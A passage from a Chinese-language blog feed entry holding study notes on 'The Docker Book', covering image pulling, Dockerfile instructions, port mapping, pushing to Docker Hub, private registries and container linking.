title="基本操作"></a>基本操作</h2><ul><li>列出镜像<pre><code>docker images</code></pre>本地镜像都在/var/lib/docker 目录下<br>容器在/var/lib/docker/containers</li></ul><p>镜像从仓库下载而来，仓库在registry ，默认的registry是Docker Hub<br>可以自建</p><ul><li>拉去镜像<ul><li>可以直接运行（run），自动拉去，<br>  如果为指定标签，会自动下载:latest标签的镜像</li><li>也可以使用pull命令提前拉去<br>docker pull ubuntu<br>会拉取这个仓库下所有镜像，利用docker pull ubuntu：12.10 标签特定的镜像层</li></ul></li></ul><p>docker有两种仓库</p><ul><li>用户仓库<br>  -由用户名/仓库名   组成</li><li><p>顶层仓库<br>  只包含仓库名，右Docker和特定厂商管理</p></li><li><p>查找镜像</p><p>  docker search ubuntu<br>  查找Docker上所有公共可用的镜像，</p></li></ul><h3 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h3><blockquote><p>我们不是真正 的构建镜像，只是从已有的基础镜像，构建新镜像而且，如果像构建一个全新的镜像，参考<img src="/old_post/docker/20190330095946258.png" alt></p></blockquote><p>####</p><p>在Docker hub 创建账号</p><p>使用docker login 命令在本地登录，登录后的个人信息会在$HOME/.dockercfg中</p><p>可以使用 docker inspect 命令查看新创建爱的镜像的详细信息</p><h4 id="docker-commit-命令"><a href="#docker-commit-命令" class="headerlink" title="docker commit 命令"></a>docker commit 命令</h4><p>不推荐<br>先利用镜像创建一个容器，在容器内更改<img src="/old_post/docker/20190330100409610.png" alt></p><p><img src="/old_post/docker/20190330100347575.png" alt></p><h4 id="利用Dockerfile构建镜像"><a href="#利用Dockerfile构建镜像" class="headerlink" title="利用Dockerfile构建镜像"></a>利用Dockerfile构建镜像</h4><blockquote><p>推荐这种方式，基于DSL语法的指令构建镜像，之后利用Docker build 命令构建一个新镜像，便于修改。</p></blockquote><p>在一个目录下创建一个Dockerfile文件</p><p><img src="/old_post/docker/20190330101048842.png" alt></p><ul><li>Dockerfile由一系列指令和参数构成，指令必须大写，后面会跟一个参数，每条指令都会创建一个新的镜像层，并对镜像提交，如果其中一步构建失败，可以使用最后构建 的镜像进行调试</li><li>默认run指令会在shell里使用.bin.sh -c 执行，可以使用exec格式的run指令，<img src="/old_post/docker/20190330101952779.png" alt>，将在bash中执行<br>EXPOSE 指令，告诉DOCker容器内应用程序要使用的端口，Docker不会在创建容器时自动打开，需要在run指令中指定</li><li>可以使用多个EXPOSE 指令指定多个端口</li></ul><p>使用<br>docker bulid 命令，Dockerfile中的所有指令都会被执行提交，并返回一个新镜像，可以使用-t=“仓库名/镜像名：标签”，如果没有定制标签，会使用latest标签<br>上述代码会自动在当前目录寻找一个Dockerfile文件，可以指定git仓库，在其中寻找<br><img src="/old_post/docker/20190330102636917.png" alt></p><ul><li>如果指令失败</li></ul><p>可以使用run指令 访问最后一次成功，查找原因</p><ul><li>每一步构建都会缓存，方便修改后直接从成功的那一步开始，可以在bulid命令上加上 –no–cache 忽略构建 的缓存<br>-使用相同的指令集模板，尽可能确保缓存命中<br><img src="/old_post/docker/20190330103240095.png" alt><br>MAINTAINER 设置联系方式<br>ENV　新的环境变量，例子中表示模板的最后更新时间，可以利用这个刷新一个构建，解决ａｐｔ－ｇｅｔ　ｕｐｄａｔｅ　更新问题</li></ul><p>－　docker　history 命令，查看一个镜像如何被构建出来</p><ul><li>注意启动容器时需要一个前台进程，不然容器会被结束<br><img src="/old_post/docker/20190330104008772.png" alt><br>前面是宿主机的端口，后面是容器的，只写一个随机分配一个高端口，可以在端口后加上/udp 是端口使用udp协议，默认tcp，可以在端口前加入ip地址绑定ip<ul><li>还可以使用 -P 参数，将Dockerfile里EXPOSE的端口以随机高端口的方式暴露</li></ul></li><li>可以通过 port con_name 80 查看映射的端口</li></ul><h4 id="Docker指令"><a href="#Docker指令" class="headerlink" title="Docker指令"></a>Docker指令</h4><ul><li>CMD 加命令的语法童RUN， 镜像被运行为容器时执行的命令，类似docker run后面的参数，会被run命令最后面的参数覆盖，只能有一条</li><li><p>ENTRYPONT  不会被run覆盖，将run的参数在作为参数传递给ENTRYPOINT，如果确实需要，可以使用run 的–entrypoint 标志覆盖ENTRYPOINT命令</p></li><li><p>WORKDIR 指定创建新容器时，内部的工作目录，CMD或ENTRYPOINT 指定的程序会在这个目录执行，可以利用run的-w参数指定新目录覆盖原目录，</p></li><li><p>ENV 指令</p><ul><li>添加环境变量，会被添加到容器中</li><li>可以在RUN中直接使用，可以利用反斜线使用原值</li><li>在Dockerfile使用需要加$，</li></ul></li><li>USER 指令<ul><li>指定使用的用户组，默认root</li><li>可以在run中使用 -u选项覆盖</li></ul></li><li>VOLUME 向基于镜像创建的容器添加卷，实现文件在容器间共享和重用，卷会一直存在到没有容器使用</li><li>ADD 命令 将构建环境下的文件和目录复制到镜像中，如果以/结尾，则复制整个目录，只能使用构建上下文的文件，可以使用url，如果是归档文件，指定为目录，可以自动解包，<img src="/old_post/docker/20190330111921700.png" alt></li><li>COPY命令　同ＡＤＤ　，不过不做文件提去和解压</li><li>ＯＮＢＵＬＬＤ　能为镜像添加触发器，后面根ＲＵＮ等命令，当此镜像要作为其他镜像的父镜像时，触发器的内的代码会执行，作为祖先镜像则不会</li></ul><h4 id="推送到Hub"><a href="#推送到Hub" class="headerlink" title="推送到Hub"></a>推送到Hub</h4><p>用户名/仓库名<br><img src="/old_post/docker/20190330113423542.png" alt></p><ul><li>可以利用Dockerfile自动构建</li><li><img src="/old_post/docker/20190330113605532.png" alt></li></ul><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p>docker rmi 删除一个镜像<br>docker rm 删除容器</p><h3 id="运行自己的Registry"><a href="#运行自己的Registry" class="headerlink" title="运行自己的Registry"></a>运行自己的Registry</h3><p>docker run -p 5000:5000 registry</p><p>上传镜像，在镜像明前加上主机名和端口</p><h3 id="容器连接"><a href="#容器连接" class="headerlink" title="容器连接"></a>容器连接</h3><ul><li>利用端口连接</li><li><p>Docker自己的网络栈</p><ul><li>Docker会自己创建一个网络借口，docker0，可以使用ip a show dpcker0 查看，问题，容器重启后ip会变，解决，利用docker 的容器互联，docker自动更新ip</li></ul><ul><li>docker 容器互联<ul><li>在父容器加上–link：别名选项,指定一个要连接的容器，要连接的容器可以不映射端口，</li><li>利用host ，里面的别名指定了ip，或者env环境变量，在容器内访问，可以利用–dns 标志网为容器单独配置dns</li></ul></li></ul></li><li></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一本Docker书，笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://blog.wendelltong.xyz/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Docker" scheme="http://blog.wendelltong.xyz/tags/Docker/"/>
    
  </entry>
  
</feed>
